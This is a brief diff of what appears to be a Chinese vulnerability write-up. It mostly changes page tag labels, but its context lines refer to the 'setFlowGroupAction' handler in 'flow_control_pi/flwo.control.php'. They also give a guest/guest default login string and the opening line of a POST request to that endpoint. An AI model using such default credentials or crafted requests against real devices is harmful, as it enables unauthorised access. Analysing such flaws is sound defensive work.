@@ -20,11 +20,11 @@ asset_dir: embedded-base64
 
 深入探索
 
-商务软件和生产力软件
+代理
 
-编程
+数据管理
 
-软件
+内容管理系统
 
 看下 `flow_control_pi/flwo.control.php` 关键业务 `setFlowGroupAction` 逻辑的实现
 
@@ -61,11 +61,11 @@ username=guest&password=guest?
 
 深入探索
 
-路由器
+软件
 
-网络设备
+计算机科学
 
-数据管理
+书籍
 
 ```
 POST /flow_control_pi/flwo.control.php?a=setFlowGroup HTTP/1.1
